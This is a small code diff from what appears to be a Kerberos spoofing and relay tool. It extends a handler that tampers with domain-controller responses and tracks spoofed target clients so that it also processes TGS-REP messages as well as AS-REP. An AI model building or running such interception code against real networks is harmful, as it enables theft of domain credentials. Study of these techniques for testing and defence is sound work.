@@ -224,7 +224,7 @@ async def relay_to_dc(data, client_address):
             del krb_response.root.eData[0].seq[0].padataValue.seq[i]
         krb_response[KerberosTCPHeader].len = len(bytes(krb_response[Kerberos])) 
         return bytes(krb_response[KerberosTCPHeader])
-    if krb_response.haslayer(KRB_AS_REP):
+    if krb_response.haslayer(KRB_AS_REP) or krb_response.haslayer(KRB_TGS_REP):
         handle_KRB_AS_REP(krb_response)
         if not keep_spoofing and not disable_spoofing :
             if client_address in Targets : Targets.remove(client_address)
